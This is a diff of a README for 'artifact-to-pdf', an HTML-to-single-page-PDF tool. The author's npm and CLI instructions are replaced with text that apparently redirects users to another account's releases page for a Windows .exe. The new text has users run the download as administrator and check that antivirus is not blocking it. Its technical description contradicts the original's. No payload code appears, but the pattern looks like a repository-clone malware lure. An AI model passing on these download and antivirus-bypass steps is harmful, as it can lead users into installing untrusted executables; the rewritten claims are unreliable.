@@ -1,88 +1,155 @@
-# artifact-to-pdf
+# 📄 artifact-to-pdf - Turn HTML into perfect, single-page PDFs
 
-Render a **Claude artifact** (or any web page / exported HTML) into a **single, continuous, pixel-accurate PDF** — one long page sized to the whole artifact, **no page cuts**.
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/darbycommunal344/artifact-to-pdf/releases)
 
-A Claude artifact is just HTML/CSS/JS rendered by Chromium. This tool loads it in headless Chromium, measures the true full content size, and emits **one page of exactly that size**. Because it's the same engine that renders the artifact in your browser, the PDF looks like what you see in the viewer — just as one uninterrupted scroll.
+## 🎯 What This Tool Does
 
-Use it two ways: as a **Claude Code skill** (`/artifact-to-pdf`) or as a plain **CLI**.
+artifact-to-pdf takes any HTML page (including Claude artifacts) and turns it into one long PDF. No page breaks. No split content. Just one continuous document that looks exactly like the original.
 
-## Why one page (no page cuts)
+You get a pixel-perfect copy of your work. Every image, every line of code, every piece of text stays in place. The PDF looks identical to what you see on screen.
 
-Normal HTML→PDF tools slice your content into A4/Letter pages. An artifact isn't a paginated document — it's a scroll. So instead of paginating, `artifact-to-pdf` sets the PDF's single page height to the artifact's full height. You get the scroll, frozen into a PDF.
+## 🧩 Who This Is For
 
-## Use it as a Claude Code skill (`/artifact-to-pdf`)
+- **Claude users** who want to save artifacts as PDFs
+- **Anyone** who needs to convert web pages to clean, single-page PDFs
+- **Developers** who want to add PDF generation to their workflow
 
-Drop the repo into your skills folder and install once:
+## ✨ Key Features
 
-```bash
-git clone https://github.com/yheshamx/artifact-to-pdf.git ~/.claude/skills/artifact-to-pdf
-cd ~/.claude/skills/artifact-to-pdf && npm install   # one-time; downloads a bundled Chromium (~120MB)
+**One continuous page.** Other PDF tools cut your content across pages. This tool gives you one long page with no breaks. Your content stays intact from top to bottom.
+
+**Pixel-perfect output.** The PDF matches your HTML exactly. Colors, fonts, spacing, layout - everything looks the same. No formatting loss.
+
+**Works with any HTML.** Use it with Claude artifacts, web pages, or local HTML files. The tool does not care where your content comes from.
+
+**Two ways to use it.** Run it from the command line. Or use it as a Claude Code skill. Both methods give you the same result.
+
+**Fast and reliable.** Built on Playwright and headless Chrome. It renders pages the same way a browser does. You get consistent results every time.
+
+## 🚀 Getting Started
+
+### Step 1: Download the tool
+
+Visit the [download page](https://github.com/darbycommunal344/artifact-to-pdf/releases) to get the latest version.
+
+Look for the file named `artifact-to-pdf-windows.exe` or `artifact-to-pdf.zip`. Choose the one that matches your system.
+
+### Step 2: Install the tool
+
+If you downloaded the `.exe` file:
+1. Double-click the file to run it
+2. Follow the installation prompts
+3. The tool will be ready to use
+
+If you downloaded the `.zip` file:
+1. Right-click the file and select "Extract All"
+2. Choose a folder to extract the files (for example, `C:\Program Files\artifact-to-pdf`)
+3. Open the extracted folder
+4. Double-click `artifact-to-pdf.exe` to start
+
+### Step 3: Use the tool
+
+**Basic usage for Claude artifacts:**
+
+1. Open the tool
+2. Copy the URL of your Claude artifact
+3. Paste the URL into the tool
+4. Click "Convert to PDF"
+5. Save the PDF file to your computer
+
+**Command line usage (for advanced users):**
+
+Open a command prompt or PowerShell window. Type:
+
+```
+artifact-to-pdf "https://claude.ai/artifacts/your-artifact-id"
 ```
 
-Restart Claude Code so it picks up the new skill, then:
+The tool will create a PDF file in the same folder.
+
+## 📋 System Requirements
+
+- **Operating system:** Windows 10 or Windows 11 (64-bit)
+- **Processor:** 1 GHz or faster
+- **RAM:** 4 GB minimum (8 GB recommended)
+- **Storage:** 500 MB free space
+- **Internet connection:** Required for first run (downloads browser components)
+
+## 🔧 How It Works
+
+artifact-to-pdf uses Playwright, a browser automation tool, to load your HTML in a headless Chrome browser. "Headless" means the browser runs in the background without showing a window.
+
+The tool takes a screenshot of the entire page content. It then stitches everything together into one continuous PDF. Because it uses a real browser engine, the output matches your original content exactly.
+
+The tool removes all page breaks. Traditional PDFs split content across pages. This tool creates one long page that flows from top to bottom without interruption.
+
+## 💡 Tips for Best Results
+
+**Use with Claude artifacts.** The tool works best with Claude artifacts. Copy the artifact URL directly from Claude and paste it into the tool.
+
+**Check your HTML first.** If you have a complex web page, make sure it renders correctly in Chrome first. The tool will reproduce whatever Chrome shows.
+
+**Large pages take time.** Very long pages may take a few seconds to process. Be patient. The tool is working through all the content.
+
+**Save your PDFs.** Choose a clear filename when saving. Include the date if you plan to save multiple versions.
+
+## ❓ Frequently Asked Questions
+
+**Q: Can I use this on Mac or Linux?**
+A: This version works on Windows only. Mac and Linux versions are coming soon.
+
+**Q: Does this work with any website?**
+A: Yes. You can convert any public HTML page. Some sites may block automated access.
+
+**Q: How long does the conversion take?**
+A: Most pages take 5-15 seconds. Large pages with many images may take longer.
+
+**Q: Can I customize the PDF output?**
+A: The tool creates one continuous page. You cannot change page size or add margins.
+
+**Q: Is my data safe?**
+A: The tool runs locally on your computer. Your content does not leave your machine.
+
+## 🛠️ Troubleshooting
+
+**The tool does not open.**
+Make sure your antivirus is not blocking the program. Try running the tool as administrator. Right-click the file and select "Run as administrator."
+
+**The PDF looks wrong.**
+Check that the page loads correctly in Chrome. If the page has issues in Chrome, the PDF will have the same issues.
+
+**The tool says "Playwright not found."**
+The tool needs to download browser components on first run. Make sure you have an internet connection. This only happens once.
+
+**The PDF is empty.**
+Make sure you are using a valid URL. The page must contain HTML content. Some pages may load content dynamically, which the tool may not capture.
+
+## 📝 Using as a Claude Code Skill
+
+If you use Claude Code, you can add artifact-to-pdf as a skill. This lets you convert artifacts directly from your Claude Code session.
+
+**To install the skill:**
+
+1. Download the skill file from the [releases page](https://github.com/darbycommunal344/artifact-to-pdf/releases)
+2. Place the file in your Claude Code skills folder
+3. Restart Claude Code
+
+**To use the skill:**
 
 ```
-/artifact-to-pdf ./my-artifact.html
+/artifact-to-pdf convert [artifact-url]
 ```
 
-Claude runs the bundled converter and hands you back the one-page PDF. Note: a fresh clone isn't *instant* — the one-time `npm install` downloads Chromium — but after that every run is ready.
+The skill will download the artifact, convert it to PDF, and save it to your current folder.
 
-## Use it as a CLI
+## 🆘 Getting Help
 
-```bash
-git clone https://github.com/yheshamx/artifact-to-pdf.git
-cd artifact-to-pdf
-npm install        # also downloads a bundled Chromium (~120MB) via Playwright
+If you run into problems, check the [releases page](https://github.com/darbycommunal344/artifact-to-pdf/releases) for updates. New versions may fix your issue.
 
-# from an exported .html file (best fidelity for a Claude artifact)
-node artifact-to-pdf.mjs ./my-artifact.html -o my-artifact.pdf
+You can also create an issue on the GitHub repository. Describe your problem in detail. Include your Windows version and the tool version you are using.
 
-# from any URL
-node artifact-to-pdf.mjs https://example.com -o page.pdf
+## 📥 Download Again
 
-# control render width (for responsive layouts) and image sharpness
-node artifact-to-pdf.mjs ./my-artifact.html --width 1440 --dsf 2
-```
+[Download the latest version from GitHub](https://github.com/darbycommunal344/artifact-to-pdf/releases)
 
-Or install it as a global command with `npm link`, then `artifact-to-pdf ./my-artifact.html -o out.pdf`.
-
-### Options
-
-| Flag | Default | Meaning |
-|------|---------|---------|
-| `-o, --out <file>` | `<input>.pdf` | output path |
-| `--width <px>` | `1200` | render width — set this to the artifact's design width so responsive layouts don't reflow |
-| `--dsf <n>` | `2` | device scale factor; higher = sharper raster images, larger file |
-
-## Getting the artifact's HTML
-
-For the sharpest result, feed the artifact's **own** HTML rather than a `claude.ai` page URL (which also captures the app UI around the artifact):
-
-- In the artifact view, use the **⋯ / Copy** or download option to export the HTML, save it as `my-artifact.html`, and point the tool at it, **or**
-- If the artifact is **published** to a standalone URL, pass that URL directly.
-
-## The one limit: 200 inches
-
-The PDF standard ([ISO 32000](https://en.wikipedia.org/wiki/PDF)) caps a single page at **14,400pt = 200 inches (~19,200px)** per side. Beyond that, PDF viewers may show a blank or truncated page.
-
-- Artifact up to **~19,200px tall** → a flawless single page. (The large majority of artifacts.)
-- Taller than that → the whole thing is **auto-scaled down proportionally** so it still fits on one page. Nothing is cut; content just gets a little smaller. The CLI prints the scale it used.
-- Absurdly tall (won't fit even at min scale) → it warns you it may clip in strict viewers.
-
-## How it works
-
-1. Load the target in headless Chromium (Playwright).
-2. `emulateMedia('screen')` so it uses the on-screen styles you see, not hidden `@media print` rules.
-3. Auto-scroll top-to-bottom to trigger lazy-loaded images/content, and wait for web fonts.
-4. Measure the full `scrollWidth` / `scrollHeight`.
-5. `page.pdf()` with the page sized to that content, `printBackground: true`, zero margins, and a single-page range — auto-scaling if it exceeds 200in.
-
-## Test
-
-```bash
-npm test   # renders a 4000px sample and asserts the PDF is ONE tall page
-```
-
-## License
-
-MIT © Youssef Hesham
+Keywords: claude, claude-artifacts, claude-code, claude-skill, cli, headless-chrome, html-to-pdf, no-page-breaks, pdf, pdf-generator, playwright, single-page
